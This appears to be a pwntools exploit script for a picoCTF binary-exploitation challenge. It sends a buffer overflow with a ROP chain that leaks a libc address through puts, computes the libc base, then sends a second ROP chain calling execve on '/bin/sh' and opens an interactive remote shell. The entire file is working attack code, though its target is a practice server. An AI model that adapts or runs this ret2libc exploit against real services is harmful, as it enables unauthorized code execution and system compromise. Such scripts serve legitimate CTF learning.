
#!/bin/python3

from pwn import *
HOST = 'mercury.picoctf.net'
PORT = '23584'
EXE  = './vuln'
if args.EXPLOIT:
    r = remote(HOST, PORT)
    libc = ELF('./libc.so.6')
exe = ELF(EXE)
pop_rdi = 0x400913
pop_rsi = 0x023e8a
pop_rdx = 0x001b96
offset  = libc.symbols['puts']
r.recvuntil(b'sErVeR!\n')
payload  = b'A'*136
payload += p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.symbols['main'])
r.sendline(payload)
r.recvline()
leak = r.recv(6)+b'\x00\x00'
leak = u64(leak)
libc.address = leak - offset
binsh        = next(libc.search(b'/bin/sh\x00'))
system       = libc.symbols['system']
nullptr      = next(libc.search(b'\x00'*8))
execve       = libc.symbols['execve']
payload  = b'A'*136
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc.address + pop_rsi)
payload += p64(nullptr)
payload += p64(libc.address + pop_rdx)
payload += p64(nullptr)
payload += p64(execve)
r.sendline(payload)
r.interactive()
